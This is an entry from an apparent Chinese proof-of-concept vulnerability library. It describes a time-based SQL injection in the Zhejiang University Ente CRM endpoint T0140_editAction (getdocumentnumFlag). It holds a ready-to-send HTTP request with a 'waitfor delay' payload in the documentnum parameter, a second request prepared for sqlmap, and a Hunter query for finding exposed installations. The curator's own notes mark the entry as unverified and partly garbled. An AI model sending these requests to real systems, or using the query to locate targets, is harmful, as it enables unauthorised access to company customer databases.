---
source: "wy876 漏洞文库"
title: "浙大恩特CRM T0140_editAction getdocumentnumFlag SQL 注入"
product: "浙大恩特CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "SQL Server，版本未知"
prerequisites: ";.js路由处理条件未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/pn2h4x4cw2ylpgty"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRM/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRMT0140_editActionSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "</font>"
hunter: "app.name=\"浙大恩特 CRM\""
id: "vw-780984d921ad47175206d50e"
entity_id: "ve-780984d921ad47175206d50e"
schema_version: "1"
---

# 浙大恩特CRM T0140_editAction getdocumentnumFlag SQL 注入

## 条目说明

- 对象与具体问题：浙大恩特CRM；T0140_editAction getdocumentnumFlag SQLi
- 版本、配置及部署条件：SQL Server，版本未知
- 认证与权限前提：;.js路由处理条件未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- FOFA元数据是</font>，正文Hunter代码中font标签嵌入，明确格式污染
- 5秒与基准URL有对照输入但没计时结果/响应，缺根因/修复
- GET特殊字符需清晰编码，方法/参数documentnum与其他Action不同应保留

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
浙大恩特CRM是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。系统支持客户数据分析和报表展示，帮助企业深度挖掘客户数据，提供决策参考。浙大恩特CRM T0140_editAction 存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

## 二、影响版本
+ 浙大恩特CRM

## 三、资产测绘
+ hunter`app.name="浙大恩特 CRM"`
+ 特征


## 四、漏洞复现
```http
GET /entsoft/T0140_editAction.entweb;.js?method=getdocumentnumFlag&documentnum=1';waitfor+delay+'0:0:5'-- HTTP/1.1
Host: xx.xx.xx.xx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```


sqlmap

```http
GET /entsoft/T0140_editAction.entweb;.js?method=getdocumentnumFlag&documentnum=1 HTTP/1.1
Host: xx.xx.xx.xx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pn2h4x4cw2ylpgty>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
